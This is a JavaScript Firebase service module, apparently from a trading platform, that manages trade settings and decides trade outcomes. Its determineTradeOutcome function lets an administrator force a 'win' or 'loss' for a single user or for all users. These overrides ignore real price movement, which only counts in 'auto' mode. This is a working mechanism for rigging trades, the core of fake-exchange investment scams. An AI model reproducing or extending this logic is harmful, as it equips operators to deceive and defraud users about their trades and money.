// src/services/tradeSettingsService.js
import { db } from "../firebase";
import { doc, getDoc, setDoc, updateDoc } from "firebase/firestore";

const SETTINGS_DOC = "tradeSettings/global";

/**
 * Get global trade settings
 */
export const getTradeSettings = async () => {
    try {
        const docRef = doc(db, "tradeSettings", "global");
        const docSnap = await getDoc(docRef);

        if (docSnap.exists()) {
            return docSnap.data();
        }

        // Default settings if not found
        return {
            globalMode: "auto",
            updatedAt: new Date(),
            updatedBy: null
        };
    } catch (error) {
        console.error("Error fetching trade settings:", error);
        return { globalMode: "auto" };
    }
};

/**
 * Update global trade settings
 */
export const updateTradeSettings = async (mode, adminUID) => {
    try {
        const docRef = doc(db, "tradeSettings", "global");
        await setDoc(docRef, {
            globalMode: mode,
            updatedAt: new Date(),
            updatedBy: adminUID
        }, { merge: true });

        return { success: true };
    } catch (error) {
        console.error("Error updating trade settings:", error);
        throw error;
    }
};

/**
 * Get user-specific trade control setting
 */
export const getUserTradeControl = async (uid) => {
    try {
        const userRef = doc(db, "users", uid);
        const userSnap = await getDoc(userRef);

        if (userSnap.exists()) {
            return userSnap.data().tradeControl || "auto";
        }

        return "auto";
    } catch (error) {
        console.error("Error fetching user trade control:", error);
        return "auto";
    }
};

/**
 * Set user-specific trade control
 */
export const setUserTradeControl = async (uid, mode) => {
    try {
        const userRef = doc(db, "users", uid);
        await updateDoc(userRef, {
            tradeControl: mode,
            updatedAt: new Date()
        });

        return { success: true };
    } catch (error) {
        console.error("Error setting user trade control:", error);
        throw error;
    }
};

/**
 * Determine trade outcome based on settings
 * Priority: User override > Global setting > Actual price
 */
export const determineTradeOutcome = async (uid, side, entryPrice, currentPrice, type = 'delivery') => {
    try {
        // Check user-specific override first
        const userControl = await getUserTradeControl(uid);

        if (userControl === "force_win") {
            return "win";
        } else if (userControl === "force_loss") {
            return "loss";
        }

        // Check global setting
        const settings = await getTradeSettings();

        if (settings.globalMode === "force_win") {
            return "win";
        } else if (settings.globalMode === "force_loss") {
            return "loss";
        }

        // Auto mode - use actual price movement
        const isProfit = side === "buy"
            ? currentPrice > entryPrice
            : currentPrice < entryPrice;

        return isProfit ? "win" : "loss";
    } catch (error) {
        console.error("Error determining trade outcome:", error);
        // Fallback to actual price movement
        const isProfit = side === "buy"
            ? currentPrice > entryPrice
            : currentPrice < entryPrice;
        return isProfit ? "win" : "loss";
    }
};
